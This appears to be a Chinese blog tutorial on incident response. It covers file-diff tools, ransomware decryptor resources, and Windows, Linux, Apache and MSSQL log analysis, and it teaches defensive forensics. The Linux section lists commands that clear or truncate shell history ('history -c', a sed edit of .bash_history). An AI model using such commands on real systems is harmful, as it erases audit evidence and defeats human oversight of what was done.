<p>Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。</p>
<p>下载地址：http://www.scootersoftware.com/download.php</p>
<p>软件使用示例，通过文件夹比较，找出文件夹中的差异内容。</p>
<p>1、双击 Beyond Compare ，打开软件主页，选择文件夹比较。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002619601.png" alt="" loading="lazy"><br>
2、在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002638210.png" alt="" loading="lazy"><br>
3、双击具体文件，进入代码对比，找到代码差异部分。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002652043.png" alt="" loading="lazy"><br>
<strong>WinMerge</strong></p>
<p>WinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。</p>
<p>下载地址：https://winmerge.org/downloads/</p>
<p>1、文件 -- 打开，选择文件或文件夹，然后点击进行比较。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002690770.png" alt="" loading="lazy"><br>
2、在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002695750.png" alt="" loading="lazy"></p>
<p>#勒索病毒自救指南</p>
<h3 id="前言-3">前言</h3>
<p>经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？</p>
<p>第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。</p>
<p>出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。</p>
<p>作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。</p>
<p>本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。</p>
<p><strong>一、勒索病毒搜索引擎</strong></p>
<p>在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找到病毒详情和解密工具。</p>
<figure data-type="image" tabindex="22"><img src="https://jinqipiaopiao.github.io//post-images/1627002779658.png" alt="" loading="lazy"></figure>
<p>这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。</p>
<p>【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒</p>
<p>官网：http://lesuobingdu.360.cn</p>
<p>【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒</p>
<p>官网：https://guanjia.qq.com/pr/ls</p>
<p>【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族</p>
<p>官网：https://lesuo.venuseye.com.cn</p>
<p>【奇安信】勒索病毒搜索引擎</p>
<p>官网：https://lesuobingdu.qianxin.com</p>
<p>【深信服】勒索病毒搜索引擎</p>
<p>官网：https://edr.sangfor.com.cn/#/information/ransom_search</p>
<hr>
<p><strong>二、勒索软件解密工具集</strong></p>
<p>很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。</p>
<p>【腾讯哈勃】勒索软件专杀工具</p>
<p>官网：https://habo.qq.com/tool</p>
<p>【金山毒霸】勒索病毒免疫工具</p>
<p>官网：http://www.duba.net/dbt/wannacry.html</p>
<p>【火绒】安全工具下载</p>
<p>官网：http://bbs.huorong.cn/forum-55-1.html</p>
<p>【瑞星】解密工具下载</p>
<p>官网：http://it.rising.com.cn/fanglesuo/index.html</p>
<p>【nomoreransom】勒索软件解密工具集</p>
<p>官网：https://www.nomoreransom.org/zh/index.html</p>
<p>【MalwareHunterTeam】勒索软件解密工具集</p>
<p>官网：https://id-ransomware.malwarehunterteam.com</p>
<p>【卡巴斯基】免费勒索解密器</p>
<p>官网：https://noransom.kaspersky.com</p>
<p>【Avast】免费勒索软件解密工具</p>
<p>官网：https://www.avast.com/zh-cn/ransomware-decryption-tools</p>
<p>【Emsisoft】免费勒索软件解密工具</p>
<p>官网：https://www.emsisoft.com/ransomware-decryption-tools/free-download</p>
<p>【GitHub 项目】勒索病毒解密工具收集汇总</p>
<p>官网：https://github.com/jiansiting/Decryption-Tools</p>
<p>#日志分析：</p>
<p>#Windows日志分析</p>
<h3 id="0x01-windows事件日志简介">0x01 Windows事件日志简介</h3>
<p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>
<p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>
<p><strong>系统日志</strong></p>
<pre><code>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。

默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx
</code></pre>
<p><strong>应用程序日志</strong></p>
<pre><code>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 

默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx
</code></pre>
<p><strong>安全日志</strong></p>
<pre><code>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。

默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx
</code></pre>
<p>​	系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。</p>
<h3 id="0x02-审核策略与事件查看器">0X02 审核策略与事件查看器</h3>
<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
<p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p>
<p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002984760.png" alt="" loading="lazy"><br>
<strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002989680.png" alt="" loading="lazy"><br>
<strong>查看系统日志方法：</strong></p>
<ol>
<li>
<p>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**</p>
</li>
<li>
<p>按 &quot;<strong>Window+R</strong>&quot;，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>”<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002993979.png" alt="" loading="lazy"></p>
</li>
</ol>
<h3 id="0x03-事件日志分析">0x03 事件日志分析</h3>
<p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p>
<table>
<thead>
<tr>
<th style="text-align:left">事件ID</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">4624</td>
<td>登录成功</td>
</tr>
<tr>
<td style="text-align:left">4625</td>
<td>登录失败</td>
</tr>
<tr>
<td style="text-align:left">4634</td>
<td>注销成功</td>
</tr>
<tr>
<td style="text-align:left">4647</td>
<td>用户启动的注销</td>
</tr>
<tr>
<td style="text-align:left">4672</td>
<td>使用超级用户（如管理员）进行登录</td>
</tr>
<tr>
<td style="text-align:left">4720</td>
<td>创建用户</td>
</tr>
</tbody>
</table>
<p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p>
<table>
<thead>
<tr>
<th style="text-align:left">登录类型</th>
<th>描述</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">2</td>
<td>交互式登录（Interactive）</td>
<td>用户在本地进行登录。</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td>网络（Network）</td>
<td>最常见的情况就是连接到共享文件夹或共享打印机时。</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td>批处理（Batch）</td>
<td>通常表明某计划任务启动。</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td>服务（Service）</td>
<td>每种服务都被配置在某个特定的用户账号下运行。</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td>解锁（Unlock）</td>
<td>屏保解锁。</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td>网络明文（NetworkCleartext）</td>
<td>登录的密码在网络上是通过明文传输的，如FTP。</td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td>新凭证（NewCredentials）</td>
<td>使用带/Netonly参数的RUNAS命令运行一个程序。</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td>远程交互，（RemoteInteractive）</td>
<td>通过终端服务、远程桌面或远程协助访问计算机。</td>
</tr>
<tr>
<td style="text-align:left">11</td>
<td>缓存交互（CachedInteractive）</td>
<td>以一个域用户登录而又没有域控制器可用</td>
</tr>
</tbody>
</table>
<p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p>
<blockquote>
<p>原文链接 ：https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</p>
</blockquote>
<p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p>
<ol>
<li>
<p>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p>
</li>
<li>
<p>在事件查看器中，单击**“安全”**，查看安全日志；</p>
</li>
<li>
<p>在安全日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p>
<p>4624  --登录成功<br>
4625  --登录失败<br>
4634 -- 注销成功<br>
4647 -- 用户启动的注销<br>
4672 -- 使用超级用户（如管理员）进行登录</p>
</li>
</ol>
<p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003000182.png" alt="" loading="lazy"><br>
案例2：可以利用eventlog事件来查看计算机开关机的记录：</p>
<p>1、在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p>
<p>2、在事件查看器中，单击**“系统”**，查看系统日志；</p>
<p>3、在系统日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p>
<p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>
6005 信息 EventLog 事件日志服务已启动。(开机)<br>
6006 信息 EventLog 事件日志服务已停止。(关机)<br>
6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p>
<p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003004624.png" alt="" loading="lazy"></p>
<h3 id="0x04-日志分析工具">0x04 日志分析工具</h3>
<h4 id="log-parser">Log Parser</h4>
<p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p>
<p>Log Parser 2.2下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=24659</p>
<p>Log Parser 使用示例：https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003009295.png" alt="" loading="lazy"><br>
<strong>基本查询结构</strong></p>
<pre><code>Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot;
</code></pre>
<p><strong>使用Log Parser分析日志</strong></p>
<p>1、查询登录成功的事件</p>
<pre><code>登录成功的所有事件
LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4624&quot;

指定登录时间范围的事件：
LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;'2018-06-19 23:32:11' and TimeGenerated&lt;'2018-06-20 23:34:00' and EventID=4624&quot;

提取登录成功的用户名和IP：
LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\Security.evtx where EventID=4624&quot;

</code></pre>
<p>2、查询登录失败的事件</p>
<pre><code>登录失败的所有事件：
LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4625&quot;

提取登录失败用户名进行聚合统计：
LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,' ')  as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot; 

</code></pre>
<p>3、系统历史开关机记录：</p>
<pre><code>LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;

</code></pre>
<h4 id="logparser-lizard">LogParser Lizard</h4>
<p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p>
<p>下载地址：http://www.lizard-labs.com/log_parser_lizard.aspx</p>
<p>依赖包：Microsoft .NET Framework 4 .5，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=42642</p>
<p>查询最近用户登录情况：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003014818.png" alt="" loading="lazy"></p>
<h4 id="event-log-explorer">Event Log Explorer</h4>
<p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p>
<p>下载地址：https://event-log-explorer.en.softonic.com/<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003018475.png" alt="" loading="lazy"><br>
参考链接：</p>
<p>Windows日志分析   https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</p>
<p>#Linux日志分析</p>
<h3 id="0x00-前言-2">0x00 前言</h3>
<p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p>
<h3 id="0x01-日志简介">0x01 日志简介</h3>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th style="text-align:center">日志文件</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">/var/log/cron</td>
<td style="text-align:center">记录了系统定时任务相关的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/cups</td>
<td style="text-align:center">记录打印信息的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/dmesg</td>
<td style="text-align:center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/mailog</td>
<td style="text-align:center">记录邮件信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/message</td>
<td style="text-align:center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td style="text-align:center">/var/log/btmp</td>
<td style="text-align:center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/lastlog</td>
<td style="text-align:center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/wtmp</td>
<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/utmp</td>
<td style="text-align:center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td style="text-align:center">/var/log/secure</td>
<td style="text-align:center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody>
</table>
<p>比较重要的几个日志：<br>
登录失败记录：/var/log/btmp     //lastb<br>
最后一次登录：/var/log/lastlog  //lastlog<br>
登录成功记录: /var/log/wtmp     //last<br>
登录日志记录：/var/log/secure</p>
<p>​	目前登录用户信息：/var/run/utmp  //w、who、users</p>
<p>​	历史命令记录：history<br>
​	仅清理当前用户： history -c</p>
<h3 id="0x02-日志分析技巧">0x02 日志分析技巧</h3>
<h4 id="a-常用的shell命令">A、常用的shell命令</h4>
<p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p>
<p>小技巧：</p>
<p>1、grep显示前后几行信息:</p>
<pre><code>	标准unix/linux下的grep通过下面參数控制上下文：
​	grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行
​	grep -B 5 foo file 显示foo及前5行
​	grep -A 5 foo file 显示foo及后5行
​	查看grep版本号的方法是
​	grep -V
</code></pre>
<p>2、grep 查找含有某字符串的所有文件</p>
<pre><code>	grep -rn &quot;hello,world!&quot; 
	* : 表示当前目录所有文件，也可以是某个文件名
	-r 是递归查找
	-n 是显示行号
	-R 查找所有文件包含子目录
	-i 忽略大小写
</code></pre>
<p>3、如何显示一个文件的某几行：</p>
<pre><code>	cat input_file | tail -n +1000 | head -n 2000
	#从第1000行开始，显示2000行。即显示1000~2999行
</code></pre>
<p>4、find /etc -name init</p>
<pre><code>//在目录/etc中查找文件init
</code></pre>
<p>5、只是显示/etc/passwd的账户</p>
<pre><code>`cat /etc/passwd |awk  -F ':'  '{print $1}'`  
//awk -F指定域分隔符为':'，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。
</code></pre>
<p>6、sed -i '153,$d' .bash_history</p>
<pre><code>删除历史操作记录，只保留前153行
</code></pre>
<h4 id="b-日志分析技巧">B、日志分析技巧</h4>
<p><strong>A、/var/log/secure</strong></p>
<pre><code>1、定位有多少IP在爆破主机的root帐号：    
grep &quot;Failed password for root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

定位有哪些IP在爆破：
grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c

爆破用户名字典是什么？
 grep &quot;Failed password&quot; /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}'|uniq -c|sort -nr
 
2、登录成功的IP有哪些： 	
grep &quot;Accepted &quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

登录成功的日期、用户名、IP：
grep &quot;Accepted &quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 

3、增加一个用户kali日志：
Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001
Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali
, shell=/bin/bash
Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali
#grep &quot;useradd&quot; /var/log/secure 

4、删除用户kali日志：
Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali'
Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'
Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'
# grep &quot;userdel&quot; /var/log/secure

5、su切换用户：
Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)

sudo授权执行:
sudo -l
Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now
</code></pre>
<p><strong>2、/var/log/yum.log</strong></p>
<p>软件安装升级卸载日志：</p>
<pre><code>yum install gcc
yum install gcc

    [root@bogon ~]# more /var/log/yum.log

Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686
</code></pre>
<h1 id="web日志分析">Web日志分析</h1>
<h3 id="ox01-web日志">ox01  Web日志</h3>
<p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>
<p>我们来看一条Apache的访问日志：</p>
<p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p>
<p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p>
<p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p>
<h3 id="0x02-日志分析技巧-2">0x02 日志分析技巧</h3>
<p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p>
<p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p>
<p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p>
<p>常用分析工具：</p>
<p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p>
<p>Linux下，使用Shell命令组合查询分析。</p>
<p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p>
<p>Apache日志分析技巧：</p>
<pre><code>1、列出当天访问次数最多的IP命令：
cut -d- -f 1 log_file|uniq -c | sort -rn | head -20

2、查看当天有多少个IP访问：
awk '{print $1}' log_file|sort|uniq|wc -l

3、查看某一个页面被访问的次数：
grep &quot;/index.php&quot; log_file | wc -l

4、查看每一个IP访问了多少个页面：
awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file

5、将每个IP访问的页面数进行从小到大排序：
awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n

6、查看某一个IP访问了哪些页面：
grep ^111.111.111.111 log_file| awk '{print $1,$7}'

7、去掉搜索引擎统计当天的页面：
awk '{print $12,$1}' log_file | grep ^\&quot;Mozilla | awk '{print $2}' |sort | uniq | wc -l

8、查看2018年6月21日14时这一个小时内有多少IP访问:
awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l	
</code></pre>
<h3 id="0x03-日志分析案例">0x03 日志分析案例</h3>
<p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p>
<p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p>
<p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p>
<p>1、定位攻击源</p>
<p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003104843.png" alt="" loading="lazy"><br>
浏览器指纹：</p>
<p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p>
<p>2、搜索相关日志记录</p>
<p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003109898.png" alt="" loading="lazy"><br>
3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>
<p>A、攻击者访问首页和登录页<br>
B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx<br>
C、攻击者访问Xzuser.aspx<br>
D、攻击者多次POST（怀疑通过这个页面上传模块缺陷）<br>
E、攻击者访问了图片木马</p>
<p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p>
<h3 id="0x04-日志统计分析技巧">0x04 日志统计分析技巧</h3>
<p>统计爬虫：</p>
<pre><code>```javascript
grep -E 'Googlebot|Baiduspider'  /www/logs/access.2019-02-23.log | awk '{ print $1 }' | sort | uniq
```
</code></pre>
<p>统计浏览器：</p>
<pre><code>```javascript
cat /www/logs/access.2019-02-23.log | grep -v -E 'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon' | sort | uniq -c | sort -r -n | head -n 100		
```
</code></pre>
<p>IP 统计：</p>
<pre><code>```javascript
grep '23/May/2019' /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4}' | sort | uniq -c | sort -r -n | head -n 10
2206 219.136.134.13
1497 182.34.15.248
1431 211.140.143.100
1431 119.145.149.106
1427 61.183.15.179
1427 218.6.8.189
1422 124.232.150.171
1421 106.187.47.224
1420 61.160.220.252
1418 114.80.201.18			
```
</code></pre>
<p>统计网段：</p>
<pre><code>```javascript
cat /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;}' | sort | uniq -c | sort -r -n | head -n 200			
```
</code></pre>
<p>统计域名：</p>
<pre><code>```javascript
cat  /www/logs/access.2019-02-23.log |awk '{print $2}'|sort|uniq -c|sort -rn|more		
```
</code></pre>
<p>HTTP Status：</p>
<pre><code>```javascript
cat  /www/logs/access.2019-02-23.log |awk '{print $9}'|sort|uniq -c|sort -rn|more
5056585 304
1125579 200
7602 400
    5 301	
```
</code></pre>
<p>URL 统计：</p>
<pre><code>```javascript
cat  /www/logs/access.2019-02-23.log |awk '{print $7}'|sort|uniq -c|sort -rn|more			
```
</code></pre>
<p>文件流量统计：</p>
<pre><code>```javascript
cat /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort -rn|more

grep ' 200 ' /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort -rn|more			
```
</code></pre>
<p>URL访问量统计：</p>
<pre><code>```javascript
cat /www/logs/access.2019-02-23.log | awk '{print $7}' | egrep '\?|&amp;' | sort | uniq -c | sort -rn | more			
```
</code></pre>
<p>脚本运行速度：</p>
<p>查出运行速度最慢的脚本</p>
<pre><code>javascript
grep -v 0$ /www/logs/access.2019-02-23.log | awk -F '\&quot; ' '{print $4&quot; &quot; $1}' web.log | awk '{print $1&quot; &quot;$8}' | sort -n -k 1 -r | uniq &gt; /tmp/slow_url.txt			
</code></pre>
<p>IP, URL 抽取：</p>
<pre><code>javascript
tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '{print $1&quot; &quot;$7}'			
</code></pre>
<h1 id="mssql日志分析">MSSQL日志分析</h1>
<p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
<h3 id="0x01-mssql日志分析">0x01 MSSQL日志分析</h3>
<p>首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003319570.png" alt="" loading="lazy"><br>
登录到SQL Server Management Studio，依次点击 管理--SQL Server 日志<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003325425.png" alt="" loading="lazy"><br>
